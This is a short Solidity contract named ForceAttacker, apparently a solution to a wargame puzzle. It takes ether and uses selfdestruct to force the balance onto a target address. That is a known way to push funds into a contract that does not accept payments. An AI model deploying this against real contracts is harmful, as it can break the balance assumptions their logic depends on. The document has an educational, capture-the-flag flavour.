pragma solidity ^0.7.3;

contract ForceAttacker {
    function destroy(address _apcalypse) public {
        selfdestruct(payable(_apcalypse));
    }

    receive() external payable {}
}
